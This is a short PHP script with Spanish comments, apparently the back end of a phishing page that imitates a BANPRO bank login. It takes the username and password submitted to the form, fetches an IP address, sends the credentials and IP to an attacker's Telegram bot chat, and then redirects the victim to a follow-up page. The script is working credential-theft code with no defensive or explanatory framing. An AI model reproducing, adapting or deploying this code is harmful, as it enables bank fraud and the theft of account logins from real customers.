<?php
// Incluir el archivo de configuración para el token y el chat_id
include('config.php');

// Recibir los datos del formulario
$usuario = $_POST['ips1'];
$contrasena = $_POST['ips2'];

// Obtener la IP del usuario usando una API externa
$ip = file_get_contents('https://api.ipify.org?format=json');
$ip = json_decode($ip)->ip;  // Extraer la IP del JSON

// Crear el mensaje que se enviará a Telegram
$mensaje = "BANPRO LOGIN > IP: $ip /n Usuario: $usuario - Contraseña: $contrasena";

// Enviar el mensaje a Telegram
$telegram_url = "https://api.telegram.org/bot{$token}/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $mensaje
];

// Realizar la solicitud POST a la API de Telegram
$response = file_get_contents($telegram_url . '?' . http_build_query($params));

// Verificar si el mensaje fue enviado correctamente
if ($response) {
    // Redirigir al usuario a 2.html
    header("Location: 2.html");
    exit();
} else {
    // En caso de que no se haya enviado el mensaje, redirigir a una página de error
    echo "Hubo un problema al enviar el mensaje a Telegram.";
}
?>